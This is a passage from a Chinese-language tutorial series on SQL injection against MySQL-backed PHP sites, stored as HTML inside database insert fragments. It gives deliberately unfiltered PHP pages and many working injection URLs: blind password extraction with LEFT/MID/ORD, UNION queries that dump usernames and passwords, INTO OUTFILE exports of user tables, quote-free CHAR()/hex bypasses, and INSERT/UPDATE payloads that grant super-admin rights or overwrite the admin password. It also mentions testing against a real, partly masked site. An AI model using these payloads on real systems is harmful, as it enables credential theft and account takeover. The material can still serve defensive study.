Query:$sql&lt;p&gt;&quot;;</p>\r\n\r\n<p>if ($tatol &lt;=0){<br />\r\necho &quot;The &quot;&lt;b&gt;$keywords&lt;/b&gt;&quot; was not found in all the record.&lt;p&gt;n&quot;;<br />\r\n} else {<br />\r\nwhile ($article=mysql_fetch_array($result)) {<br />\r\necho &quot;&lt;li&gt;&quot;.htmlspecialchars($article[title]).&quot;&lt;p&gt;n&quot;;<br />\r\n} //while<br />\r\n}<br />\r\n} else {<br />\r\necho &quot;&lt;b&gt;Please enter some keywords.&lt;/b&gt;&lt;p&gt;n&quot;;<br />\r\n}<br />\r\n?&gt;</p>\r\n\r\n<p>一般程序都是这样写的，如果缺乏变量检查，我们就可以改写变量，达到&ldquo;注入&rdquo;的目的，尽管没有危害，当我们输入&ldquo;___&rdquo; 、&ldquo;.__ &rdquo;、&ldquo;%&rdquo;等类似的关键字时，会把数据库中的所有记录都取出来。如果我们在表单提交：</p>\r\n\r\n<p>%&#39; ORDER BY articleid/*<br />\r\n%&#39; ORDER BY articleid#<br />\r\n__&#39; ORDER BY articleid/*<br />\r\n__&#39; ORDER BY articleid#</p>\r\n\r\n<p>SQL语句就被改变成下面的样子了，</p>\r\n\r\n<p>SELECT * FROM article WHERE title LIKE &#39;%%&#39; ORDER BY articleid/*%&#39; ORDER BY title DESC<br />\r\nSELECT * FROM article WHERE title LIKE &#39;%__&#39; ORDER BY articleid#%&#39; ORDER BY title DESC</p>\r\n\r\n<p>就会列出所有记录，包括被隐藏的，还可以改变排列顺序。这个虽然危害不大，也算是注入的一种方式了吧？</p>\r\n\r\n<p>二、查询字段</p>\r\n\r\n<p>查询字段又可以分成两种，本表查询和跨表查询，这两种查询和ACCESS、MSSQL差不多，甚至更强大、更灵活、更方便。不知道为什么就是有人认为比ASP难？我们在ASP中经常使用的个别函数在PHP里要有小小的改动，如下：</p>\r\n\r\n<p>① 本表查询</p>\r\n\r\n<p>看下面一条SQL语句，多用在论坛或者会员注册系统查看用户资料的，</p>\r\n\r\n<p>&lt;?php<br />\r\n$servername = &quot;localhost&quot;;<br />\r\n$dbusername = &quot;root&quot;;<br />\r\n$dbpassword = &quot;&quot;;<br />\r\n$dbname = &quot;injection&quot;;</p>\r\n\r\n<p>mysql_connect($servername,$dbusername,$dbpassword) or die (&quot;数据库连接失败&quot;);</p>\r\n\r\n<p>$sql = &quot;SELECT * FROM user WHERE username=&#39;$username&#39;&quot;;<br />\r\n$result = mysql_db_query($dbname,$sql);<br />\r\n$row = mysql_fetch_array($result);</p>\r\n\r\n<p>if (!$row) {<br />\r\necho &quot;该记录不存在&quot;;<br />\r\necho &quot;&lt;p&gt;SQL Query:$sql&lt;p&gt;&quot;;<br />\r\nexit;<br />\r\n}</p>\r\n\r\n<p>echo &quot;你要查询的用户ID是：$row[userid]n&quot;;<br />\r\necho &quot;&lt;p&gt;SQL Query:$sql&lt;p&gt;&quot;;<br />\r\n?&gt;</p>\r\n\r\n<p>当我们提交的用户名为真时，就会正常返回用户的ID，如果为非法参数就会提示相应的错误，由于是查询用户资料，我们可以大胆猜测密码就存在这个数据表里（现在我还没有碰见过密码是单独存在另一个表的程序），记得刚才的身份验证程序吗？和现在的相比，就少了一个AND条件，如下：</p>\r\n\r\n<p>SELECT * FROM user WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;SELECT * FROM user WHERE username=&#39;$username&#39;</p>\r\n\r\n<p>相同的就是当条件为真时，就会给出正确的提示信息，如果我们构造出后面的AND条件部分，并使这部分为真，那我们的目的也就达到了，还是利用刚才建立的user数据库，用户名为angel，密码为mypass，<br />\r\n看了上面的例子，应该知道构造了吧，如果我们提交：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?username=angel&#39; and password=&#39;mypass</p>\r\n\r\n<p>这个是绝对为真的，因为我们这样提交上面的SQL语句变成了下面的样子：</p>\r\n\r\n<p>SELECT * FROM user WHERE username=&#39;angel&#39; AND password=&#39;mypass&#39;</p>\r\n\r\n<p>但在实际的攻击中，我们是肯定不知道密码的，假设我们知道数据库的各个字段，下面我们就开始探测密码了，首先获取密码长度：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?username=angel&#39; and LENGTH(password)=&#39;6</p>\r\n\r\n<p>在ACCESS中，用LEN()函数来获取字符串长度，在MYSQL中，要使用LENGTH()，只要没有构造错误，也就是说SQL语句能正常执行，那返回结果无外乎两种，不是返回用户ID，就是返回&ldquo;该记录不存在&rdquo;。当用户名为angel并且密码长度为6的时候返回真，就会返回相关记录，是不是和ASP里一样？再用LEFT()、RIGHT()、MID()函数猜密码：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?username=angel&#39; and LEFT(password,1)=&#39;m<br />\r\nhttp://127.0.0.1/injection/user.php?username=angel&#39; and LEFT(password,2)=&#39;my<br />\r\nhttp://127.0.0.1/injection/user.php?username=angel&#39; and LEFT(password,3)=&#39;myp<br />\r\nhttp://127.0.0.1/injection/user.php?username=angel&#39; and LEFT(password,4)=&#39;mypa<br />\r\nhttp://127.0.0.1/injection/user.php?username=angel&#39; and LEFT(password,5)=&#39;mypas<br />\r\nhttp://127.0.0.1/injection/user.php?username=angel&#39; and LEFT(password,6)=&#39;mypass</p>\r\n\r\n<p>看，密码不是出来了吗？简单吧？当然实际情况会有不少条件限制，下面还会讲到这个例子的深入应用。</p>\r\n\r\n<p>② 跨表查询</p>\r\n\r\n<p>这部分就和ASP有点出入了，除了一定要用UNION连接两条SQL语句，最难掌握的就是字段的数量，如果看过MYSQL参考手册，就知道了在 SELECT 中的 select_expression (select_expression 表示你希望检索的列[字段]) 部分列出的列必须具有同样的类型。第一个 SELECT 查询中使用的列名将作为结果集的列名返回。简单的说，也就是UNION后面查选的字段数量、字段类型都应该与前面的SELECT一样，而且，如果前面的SELECT为真，就同时返回两个SELECT的结果，当前面的SELECT为假，就会返回第二个SELECT所得的结果，某些情况会替换掉在第一个SELECT原来应该显示的字段，如下图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731160615995028.jpg\" style=\"height:405px; width:700px\" /></p>\r\n\r\n<p>看了这个图直观多了吧？所以应该先知道前面查询表的数据表的结构。如果我们查询两个数据表的字段相同，类型也相同，我们就可以这样提交:</p>\r\n\r\n<p>SELECT * FROM article WHERE articleid=&#39;$id&#39; UNION SELECT * FROM&hellip;&hellip;</p>\r\n\r\n<p>如果字段数量、字段类型任意一个不相同，就只能搞清除数据类型和字段数量，这样提交：</p>\r\n\r\n<p>SELECT * FROM article WHERE articleid=&#39;$id&#39; UNION SELECT 1,1,1,1,1,1,1 FROM&hellip;&hellip;</p>\r\n\r\n<p>否则就会报错：</p>\r\n\r\n<p>The used SELECT statements have a different number of columns</p>\r\n\r\n<p>如果不知道数据类型和字段数量，可以用1来慢慢试，因为1属于intstrvar类型，所以我们只要慢慢改变数量，一定可以猜到的。如果不能马上理解上面的理论，后面有很详细的例子。<br />\r\n我们看看下面的数据结构，是一个简单的文章数据表。</p>\r\n\r\n<p>CREATE TABLE `article` (<br />\r\n`articleid` int(11) NOT NULL auto_increment,<br />\r\n`title` varchar(100) NOT NULL default &#39;&#39;,<br />\r\n`content` text NOT NULL,<br />\r\nPRIMARY KEY (`articleid`)<br />\r\n) TYPE=MyISAM AUTO_INCREMENT=3 ;</p>\r\n\r\n<p>#<br />\r\n# 导出表中的数据 `article`<br />\r\n#</p>\r\n\r\n<p>INSERT INTO `article` VALUES (1, &#39;我是一个不爱读书的孩子&#39;, &#39;中国的教育制度真是他妈的落后！如果我当教育部长。我要把所有老师都解雇！&#39;);<br />\r\nINSERT INTO `article` VALUES (2, &#39;我恨死你&#39;, &#39;我恨死你了，你是什么东西啊&#39;);</p>\r\n\r\n<p>这个表的字段类型分别是int、varchar、text，如果我们用UNION联合查询的时候，后面的查询的表的结构和这个一样。就可以用&ldquo;SELECT *&rdquo;，如果有任何一个不一样，那我们只能用&ldquo;SELECT 1,1,1,1&hellip;&hellip;&rdquo;了。</p>\r\n\r\n<p>下面的文件是一个很标准、简单的显示文章的文件，很多站点都是这种页面没有过滤，所以成为最明显的注入点，下面就拿这个文件作为例子，开始我们的注入实验。</p>\r\n\r\n<p>&lt;?php<br />\r\n$servername = &quot;localhost&quot;;<br />\r\n$dbusername = &quot;root&quot;;<br />\r\n$dbpassword = &quot;&quot;;<br />\r\n$dbname = &quot;injection&quot;;</p>\r\n\r\n<p>mysql_connect($servername,$dbusername,$dbpassword) or die (&quot;数据库连接失败&quot;);</p>\r\n\r\n<p>$sql = &quot;SELECT * FROM article WHERE articleid=&#39;$id&#39;&quot;;<br />\r\n$result = mysql_db_query($dbname,$sql);<br />\r\n$row = mysql_fetch_array($result);</p>\r\n\r\n<p>if (!$row)<br />\r\n{<br />\r\necho &quot;该记录不存在&quot;;<br />\r\necho &quot;&lt;p&gt;SQL Query:$sql&lt;p&gt;&quot;;<br />\r\nexit;<br />\r\n}</p>\r\n\r\n<p>echo &quot;title&lt;br&gt;&quot;.$row[title].&quot;&lt;p&gt;n&quot;;<br />\r\necho &quot;content&lt;br&gt;&quot;.$row[content].&quot;&lt;p&gt;n&quot;;<br />\r\necho &quot;&lt;p&gt;SQL Query:$sql&lt;p&gt;&quot;;<br />\r\n?&gt;</p>\r\n\r\n<p>正常情况下，我们提交这样的一个请求：</p>\r\n\r\n<p>http://127.0.0.1/injection/show.php?id=1</p>\r\n\r\n<p>就会显示articleid为1的文章，但我们不需要文章，我们需要的是用户的敏感信息，就要查询user表，现在是查询刚才我们建立的user表。<br />\r\n由于$id没有过滤给我们制造了这个机会，我们要把show.php文件中的SQL语句改写成类似这个样子：</p>\r\n\r\n<p>SELECT * FROM article WHERE articleid=&#39;$id&#39; UNION SELECT * FROM user &hellip;&hellip;</p>\r\n\r\n<p>由于这个代码是有单引号包含着变量的，我们现在提交：</p>\r\n\r\n<p>http://127.0.0.1/injection/show.php?id=1&#39; union select 1,username,password from user/*</p>\r\n\r\n<p>按道理说，应该显示用户表的username、password两个字段的内容才对啊，怎么正常显示文章呢？如图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731160659187643.jpg\" style=\"height:180px; width:778px\" /></p>\r\n',0,1438330042,0,0),(154,42,'Mysql注入:SQL Injection with MySQL(二)','<p>其实，我们提交的articleid=1是article表里存在的，执行结果就是真了，自然返回前面SELECT的结果，当我们提交空的值或者提交一个不存在的值，就会蹦出我们想要的东西：</p>\r\n\r\n<p>http://127.0.0.1/injection/show.php?id=&#39; union select 1,username,password from user/*<br />\r\nhttp://127.0.0.1/injection/show.php?id=99999&#39; union select 1,username,password from user/*</p>\r\n\r\n<p>如图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731161149143890.jpg\" style=\"height:180px; width:770px\" /></p>\r\n\r\n<p>现在就在字段相对应的地方显示出我们所要的内容。如果还不清楚思路以及具体的应用，后面还会讲到一些高级的技巧。</p>\r\n\r\n<p>三、导出文件</p>\r\n\r\n<p>这个是比较容易构造但又有一定限制的技术，我们经常可以看见以下的SQL语句：</p>\r\n\r\n<p>select * from table into outfile &#39;c:/file.txt&#39;<br />\r\nselect * from table into outfile &#39;/var/www/file.txt&#39;</p>\r\n\r\n<p>但这样的语句，一般很少用在程序里，有谁会把自己的数据导出呢？除非是备份，但我也没有见过这种备份法。所以我们要自己构造，但必须有下面的前提条件：<br />\r\n必须导出到能访问的目录，这样才能下载。能访问的目录必须要有可写的权限，否则导出会失败。确保硬盘有足够的容量能容下导出的数据，这个很少见。确保要已经存在相同的文件名，会导致导出失败，并提示：&ldquo;File &#39;c:/file.txt&#39; already exists&rdquo;，这样可以防止数据库表和文件例如/etc/passwd被破坏。</p>\r\n\r\n<p>我们继续用上面的user.php和show.php两个文件举例，如果一个一个用户猜解实在是太慢了，如果对方的密码或者其他敏感信息很复杂，又不会写Exploit，要猜到什么时候啊？来点大范围的，直接导出全部数据好了。user.php文件的查询语句，我们按照into outfile的标准格式，注入成下面的语句就能导出我们需要的信息了：</p>\r\n\r\n<p>SELECT * FROM user WHERE username=&#39;$username&#39; into outfile &#39;c:/file.txt&#39;</p>\r\n\r\n<p>知道怎么样的语句可以实现我们的目的，我们就很容易构造出相应的语句：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?username=angel&#39; into outfile &#39;c:/file.txt</p>\r\n\r\n<p>出现了错误提示，但从返回的语句看来，我们的SQL语句确实是注入正确了，即使出现错误，也是查询的问题了，文件还是乖乖的被导出了，如图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731161225346395.jpg\" style=\"height:479px; width:701px\" /></p>\r\n\r\n<p>由于代码本身就有WHERE来指定一个条件，所以我们导出的数据仅仅是满足这个条件的数据，如果我们想导出全部呢？其实很简单，只要使这个WHERE条件为假，并且指定一个成真的条件，就可以不用被束缚在WHERE里了，来看看经典1=1发挥作用了：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?username=&#39; or 1=1 into outfile &#39;c:/file.txt</p>\r\n\r\n<p>实际的SQL语句变为：</p>\r\n\r\n<p>SELECT * FROM user WHERE username=&#39;&#39; or 1=1 into outfile &#39;c:/file.txt&#39;</p>\r\n\r\n<p>这样username的参数是空的，就是假了，1=1永远是真的，那or前面的WHERE就不起作用了，但千万别用and哦，否则是不能导出全部数据的。<br />\r\n既然条件满足，在这种情况下就直接导出所有数据！如图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731161329377212.jpg\" style=\"height:126px; width:479px\" /></p>\r\n\r\n<p>但是跨表的导出文件的语句该怎么构造呢？还是用到UNION联合查询，所以一切前提条件都应该和UNION、导出数据一样，跨表导出数据正常情况下应该相下面的一样：</p>\r\n\r\n<p>SELECT * FROM article WHERE articleid=&#39;1&#39; union select 1,username,password from user into outfile &#39;c:/user.txt&#39;</p>\r\n\r\n<p>这样可以导出文件了，如果我们要构造就提交：</p>\r\n\r\n<p>http://127.0.0.1/injection/show.php?id=1&#39; union select 1,username,password from user into outfile &#39;c:/user.txt</p>\r\n\r\n<p>文件是出来了，可是有一个问题，由于前面的查询articleid=&#39;1&#39;为真了，所以导出的数据也有整个文章的一部分，如图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731161412355459.jpg\" style=\"height:134px; width:544px\" /></p>\r\n\r\n<p>所以我们把应该使前面的查询语句为假，才能只导出后面查询的内容，只要提交：</p>\r\n\r\n<p>http://127.0.0.1/injection/show.php?id=&#39; union select 1,username,password from user into outfile &#39;c:/user.txt</p>\r\n\r\n<p>这样才能得到我们想要的资料：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731161457954818.jpg\" style=\"height:126px; width:479px\" /></p>\r\n\r\n<p>值得注意的是想要导出文件，必须magic_quotes_gpc没有打开，并且程序也没有用到addslashes()函数，还有不能对单引号做任何过滤，因为我们在提交导出路径的时候，一定要用引号包含起来，否则，系统不会认识那是一个路径，也不用尝试用char()或者什么函数，那是徒劳。</p>\r\n\r\n<p>INSERT</p>\r\n\r\n<p>如果大家认为MYSQL中注入仅仅适用于SELECT就大错特错了，其实还有两个危害更大的操作，那就是INSERT和UPDATE语句，这类例子不多，先面先说说INSERT，这主要应用于改写插入的数据，我们来看个简单而又广泛存在的例子，看看下面的数据结构：</p>\r\n\r\n<p>CREATE TABLE `user` (<br />\r\n`userid` INT NOT NULL AUTO_INCREMENT ,<br />\r\n`username` VARCHAR( 20 ) NOT NULL ,<br />\r\n`password` VARCHAR( 50 ) NOT NULL ,<br />\r\n`homepage` VARCHAR( 255 ) NOT NULL ,<br />\r\n`userlevel` INT DEFAULT &#39;1&#39; NOT NULL ,<br />\r\nPRIMARY KEY ( `userid` )<br />\r\n);</p>\r\n\r\n<p>其中的userlevel代表用户的等级，1是普通用户，2是普通管理员，3是超级管理员，一个注册程序默认是注册成普通用户，如下：</p>\r\n\r\n<p>INSERT INTO `user` (userid, username, password, homepage, userlevel) VALUES (&#39;&#39;, &#39;$username&#39;, &#39;$password&#39;, &#39;$homepage&#39;, &#39;1&#39;);</p>\r\n\r\n<p>默认userlevel字段是插入1，其中的变量都是没有经过过滤就直接写入数据库的，不知道大家有什么想法？对，就是直接注入，使我们一注册就是超级管理员。我们注册的时候，构造$homepage变量，就可以达到改写的目的，指定$homepage变量为：</p>\r\n\r\n<p>http://4ngel.net&#39;, &#39;3&rsquo;)#</p>\r\n\r\n<p>插入数据库的时候就变成：</p>\r\n\r\n<p>INSERT INTO `user` (userid, username, password, homepage, userlevel) VALUES (&#39;&#39;, &#39;angel&#39;, &#39;mypass&#39;, &#39;http://4ngel.net&#39;, &#39;3&rsquo;)#&#39;, &#39;1&#39;);</p>\r\n\r\n<p>这样就注册成为超级管理员了。但这种利用方法也有一定的局限性，比如，我没有需要改写的变量如userlevel字段是数据库的第一个字段，前面没有地方给我们注入，我们也没有办法了。<br />\r\n或许INSERT还有更广泛的应用，大家可以自行研究，但原理都是一样的。</p>\r\n\r\n<p>UPDATE</p>\r\n\r\n<p>和INSERT相比，UPDATE的应用更加广泛，如果过滤不够，足以改写任何数据，还是拿刚才的注册程序来说，数据结构也不变，我们看一下用户自己修改自己的资料，SQL语句一般都是这样写的：</p>\r\n\r\n<p>UPDATE user SET password=&#39;$password&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</p>\r\n\r\n<p>用户可以修改自己的密码和主页，大家有什么想法？总不至于还是提升权限吧？程序中的SQL语句又没有更新userlevel字段，怎么提升啊？还是老办法，构造$homepage变量, 指定$homepage变量为：</p>\r\n\r\n<p>http://4ngel.net&#39;, userlevel=&#39;3</p>\r\n\r\n<p>整个SQL语句就变成这样：</p>\r\n\r\n<p>UPDATE user SET password=&#39;mypass&#39;, homepage=&#39;http://4ngel.net&#39;, userlevel=&#39;3&#39; WHERE id=&#39;$id&#39;</p>\r\n\r\n<p>我们是不是又变成超级管理员了？程序不更新userlevel字段，我们自己来。<br />\r\n还有更加绝的，直接修改任意用户的资料，还是刚才的例句，但这次安全一点，使用MD5加密：</p>\r\n\r\n<p>UPDATE user SET password=&#39;MD5($password)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</p>\r\n\r\n<p>尽管密码被加密了，但我们还是可以构造我们需要的语句，我们指定$password为：</p>\r\n\r\n<p>mypass)&#39; WHERE username=&#39;admin&#39;#</p>\r\n\r\n<p>这时整个语句变为：</p>\r\n\r\n<p>UPDATE user SET password=&#39;MD5(mypass)&#39; WHERE username=&#39;admin&#39;#)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</p>\r\n\r\n<p>这样就更改了更新的条件，我管你后面的代码是不是在哭这说：我们还没有执行啊。当然，也可以从$id下手，指定$id为：</p>\r\n\r\n<p>&#39; OR username=&#39;admin&#39;</p>\r\n\r\n<p>这时整个语句变为：</p>\r\n\r\n<p>UPDATE user SET password=&#39;MD5($password)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;&#39; OR username=&#39;admin&#39;</p>\r\n\r\n<p>照样也可以达到修改的目的，所以说注入是非常灵活的技术。如果有些变量是从数据库读取的固定值，甚至用$_SESSION[&#39;username&#39;]来读取服务器上的SESSION信息时，我们就可以在原来的WHERE之前自己构造WHERE并注释掉后面的代码，由此可见，灵活运用注释也是注入的技巧之一。这些技巧把注入发挥得淋漓尽致。不得不说是一种艺术。<br />\r\n变量的提交方式可以是GET或POST，提交的位置可以是地址栏、表单、隐藏表单变量或修改本地COOKIE信息等，提交的方式可以是本地提交，服务器上提交或者是工具提交，多种多样就看你如何运用了。</p>\r\n\r\n<p>高级应用</p>\r\n\r\n<p>1、 使用MYSQL内置函数</p>\r\n\r\n<p>我们在ACCESS、MSSQL中的注入，有很多比较高级的注入方法，比如深入到系统，猜中文等，这些东西，在MYSQL也能很好得到发挥，其实在MYSQL有很多内置函数都可以用在SQL语句里，这样就可以使我们能在注入时更灵活，得到更多关于系统的信息。有几个函数是比较常用的：</p>\r\n\r\n<p>DATABASE()<br />\r\nUSER()<br />\r\nSYSTEM_USER()<br />\r\nSESSION_USER()<br />\r\nCURRENT_USER()<br />\r\n&hellip;&hellip;</p>\r\n\r\n<p>各个函数的具体作用大家可以查阅MYSQL手册，比如下面这句UPDATE：</p>\r\n\r\n<p>UPDATE article SET title=$title WHERE articleid=1</p>\r\n\r\n<p>我们可以指定$title为以上的各个函数，因为没有被引号包含，所以函数是能正确执行的：</p>\r\n\r\n<p>UPDATE article SET title=DATABASE() WHERE id=1<br />\r\n#把当前数据库名更新到title字段<br />\r\nUPDATE article SET title=USER() WHERE id=1<br />\r\n#把当前 MySQL 用户名更新到title字段<br />\r\nUPDATE article SET title=SYSTEM_USER() WHERE id=1<br />\r\n#把当前 MySQL 用户名更新到title字段<br />\r\nUPDATE article SET title=SESSION_USER() WHERE id=1<br />\r\n#把当前 MySQL 用户名更新到title字段<br />\r\nUPDATE article SET title=CURRENT_USER() WHERE id=1<br />\r\n#把当前会话被验证匹配的用户名更新到title字段</p>\r\n\r\n<p>灵活运用MYSQL内置的函数，可以获得不少有用的信息，比如数据库版本、名字、用户、当前数据库等，比如前面跨表查询的例子，提交：</p>\r\n\r\n<p>http://127.0.0.1/injection/show.php?id=1</p>\r\n\r\n<p>可以看到一篇文章，我们怎么样才能知道MYSQL数据库的相关信息呢？同样也是用MYSQL内置函数配合UNION联合查询，不过相比之下就简单得多了，甚至还可以读取文件！既然要用到UNION，同样要满足UNION的条件&mdash;&mdash;字段数、数据类型相同。如果我们知道了数据结构，直接构造：</p>\r\n\r\n<p>http://127.0.0.1/injection/show.php?id=-1 union select 1,database(),version()</p>\r\n\r\n<p>就可以返回当前数据库名和数据库版本，构造是比较容易的。<br />\r\n下面附上一段由我好友Super&middot;Hei写的代码，可以把字符串转换为ASCII代码。感谢提供。</p>\r\n\r\n<p>#!/usr/bin/perl<br />\r\n#cody by Super&middot;Hei<br />\r\n#to angel<br />\r\n#C:&gt;test.pl c:boot.ini<br />\r\n#99,58,92,98,111,111,116,46,105,110,105</p>\r\n\r\n<p>$ARGC = @ARGV;<br />\r\nif ($ARGC != 1) {<br />\r\nprint &quot;Usage: $0 n&quot;;<br />\r\nexit(1);<br />\r\n}</p>\r\n\r\n<p>$path=shift;</p>\r\n\r\n<p>@char = unpack(&#39;C*&#39;, $path);</p>\r\n\r\n<p>$asc=join(&quot;,&quot;,@char);</p>\r\n\r\n<p>print $asc;</p>\r\n\r\n<p>2、不加单引号注入</p>\r\n\r\n<p>注：现在我们假设magic_quotes_gpc为on了。</p>\r\n\r\n<p>众所周知，整形的数据是不需要用引号引起来的，而字符串就要用引号，这样可以避免很多问题。但是如果仅仅用整形数据，我们是没有办法注入的，所以我需要把我们构造的语句转换成整形类型，这个就需要用到CHAR()，ASCII(),ORD(),CONV()这些函数了，举个简单的例子：</p>\r\n\r\n<p>SELECT * FROM user WHERE username=&#39;angel&#39;</p>\r\n\r\n<p>如何使$username不带引号呢？很简单我们这样提交就可以了。</p>\r\n\r\n<p>SELECT * FROM user WHERE username=char(97,110,103,101,108)<br />\r\n# char(97,110,103,101,108) 相当于angel，十进制。<br />\r\nSELECT * FROM user WHERE username=0x616E67656C<br />\r\n# 0x616E67656C 相当于angel，十六进制。</p>\r\n\r\n<p>其他函数大家自己去测试好了，但是前提就如上面所说的，我们可以构造的变量不被引号所包含才有意义，不然我们不管构造什么，只是字符串，发挥不了作用，比如前面猜密码的例子(user,php)，我们把查询条件改为userid：</p>\r\n\r\n<p>SELECT * FROM user WHERE userid=userid</p>\r\n\r\n<p>按照正常的，提交：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?userid=1</p>\r\n\r\n<p>就可以查询userid为1的用户资料，因为1是数字，所以有没有引号都无所谓，但是如果我们构造：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?userid=1 and password=mypass</p>\r\n\r\n<p>绝对错误，因为mypass是字符串，除非提交：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?userid=1 and password=&#39;mypass&#39;</p>\r\n\r\n<p>由于magic_quotes_gpc打开的关系，这个是绝对不可能的。引号会变成/&#39;，我们有什么办法可以把这些字符串变成整形数据吗？就是用CHAR()函数，如果我们提交：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?userid=1 and password=char(109,121,112,97,115,115)</p>\r\n\r\n<p>正常返回，实践证明，我们用CHAR()是可行的，我们就把CHAR()用进LEFT函数里面逐位猜解！</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,1)=char(109)</p>\r\n\r\n<p>正常返回，说明userid为1的用户，password字段第一位是char(109)，我们继续猜：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,2)=char(109,121)</p>\r\n\r\n<p>又正常返回，说明正确，但这样影响到效率，既然是整形，我们完全可以用比较运算符来比较：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,1)&gt;char(100)</p>\r\n\r\n<p>然后适当调整char()里面的数字来确定一个范围，很快就可以猜出来，到了后面的时候，还是可以用比较运算符来比较：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,3)&gt;char(109,121,111)</p>\r\n\r\n<p>而原来已经猜好的不用改变了，很快就可以猜完：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,6)=char(109,121,112,97,115,115)</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731161612824273.jpg\" style=\"height:453px; width:760px\" /></p>\r\n',0,1438330593,0,0),(155,42,'Mysql注入:SQL Injection with MySQL(三)','<p>然后在mysql&gt;命令提示符下或者在phpMyadmin里面执行：</p>\r\n\r\n<p>select char(109,121,112,97,115,115)</p>\r\n\r\n<p>就会返回：mypass</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731162018635198.jpg\" style=\"height:344px; width:322px\" /></p>\r\n\r\n<p>当然也可以使用SUBSTRING(str,pos,len)和MID(str,pos,len)函数，从字符串 str 的 pos 位置起返回 len 个字符的子串。这个和ACCESS是一样的。还是刚才的例子，我们猜password字段的第三位、第四位试试，第三位是p，第四位是a，我们这样构造：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?userid=1 and mid(password,3,1)=char(112)<br />\r\nhttp://127.0.0.1/injection/user.php?userid=1 and mid(password,4,1)=char(97)</p>\r\n\r\n<p>我们要的结果就迸出来了。当然，如果觉得麻烦，还可以用更简单的办法，就是利用ord()函数，具体作用可以去查看MYSQL参考手册，该函数返回的是整形类型的数据，可以用比较运算符进行比较、当然得出的结果也就快多了，也就是这样提交：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?userid=1 and ord(mid(password,3,1))&gt;111<br />\r\nhttp://127.0.0.1/injection/user.php?userid=1 and ord(mid(password,3,1))&lt;113<br />\r\nhttp://127.0.0.1/injection/user.php?userid=1 and ord(mid(password,3,1))=112</p>\r\n\r\n<p>这样我们就得出结果了，然后我们再用char()函数还原出来就好了。至于其他更多函数，大家可以自己去试验，限于篇幅也不多说了。</p>\r\n\r\n<p>3、快速确定未知数据结构的字段及类型</p>\r\n\r\n<p>如果不清楚数据结构，很难用UNION联合查询，这里我告诉大家一个小技巧，也是非常有用非常必要的技巧，充分发挥UNION的特性。<br />\r\n还是拿前面的show.php文件做例子，当我们看到形如xxx.php?id=xxx的URL的时候，如果要UNION，就要知道这个xxx.php查询的数据表的结构，我们可以这样提交来快速确定有多少个字段：</p>\r\n\r\n<p>http://127.0.0.1/injection/show.php?id=-1 union select 1,1,1</p>\r\n\r\n<p>有多少个&ldquo;1&rdquo;就表示有多少个字段，可以慢慢试，如果字段数不相同，就肯定会出错，如果字段数猜对了，就肯定会返回正确的页面，字段数出来了，就开始判断数据类型，其实也很容易，随便用几个字母代替上面的1，但是由于magic_quotes_gpc打开，我们不能用引号，老办法，还是用char()函数，char(97)表示字母&ldquo;a&rdquo;，如下：</p>\r\n\r\n<p>http://127.0.0.1/injection/show.php?id=-1 union select char(97),char(97),char(97)</p>\r\n\r\n<p>如果是字符串，那就会正常显示&ldquo;a&rdquo;，如果不是字符串或文本，也就是说是整形或布尔形，就会返回&ldquo;0&rdquo;，如图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731162054582766.jpg\" style=\"height:432px; width:521px\" /></p>\r\n\r\n<p>判断最主要靠什么？经验，我以前一直都说，经验很重要，丰富经验能更好的作出正确的判断，因为程序的代码是千变万化的，我们这里是只是举个最简单的例子，这里由于局限性，程序都是我自己写、自己测试的。方法因程序而异。希望大家在实战中，注意区别，不要照搬，灵活运用才是根本。</p>\r\n\r\n<p>4、猜数据表名</p>\r\n\r\n<p>在快速确定未知数据结构的字段及类型的基础上，我们又可以进一步的分析整个数据结构，那就是猜表名，其实使用UNION联合查询的时候，不管后面的查询怎么&ldquo;畸形&rdquo;，只要没有语句上的问题，都会正确返回，也就是说，我们可以在上面的基础上，进一步猜到表名了，比如刚才我们提交：</p>\r\n\r\n<p>http://127.0.0.1/injection/show.php?id=1 union select 1,1,1</p>\r\n\r\n<p>返回正常的内容，就说明这个文件查询的表内是存在3个字段的，然后我们在后面加入from table_name，也就是这样：</p>\r\n\r\n<p>http://127.0.0.1/injection/show.php?id=1 union select 1,1,1 from members<br />\r\nhttp://127.0.0.1/injection/show.php?id=1 union select 1,1,1 from admin<br />\r\nhttp://127.0.0.1/injection/show.php?id=1 union select 1,1,1 from user</p>\r\n\r\n<p>如果这个表是存在的，那么同样会返回应该显示的内容，如果表不存在，当然就会出错了，所以我的思路是先获得有漏洞的文件所查询表的数据结构，确定结果后再进一步查询表，这个手工操作是没有效率的问题的，不到一分钟就可以查询到了，比如我们在测试www.***bai.net就是这样，后面的实例会涉及到。<br 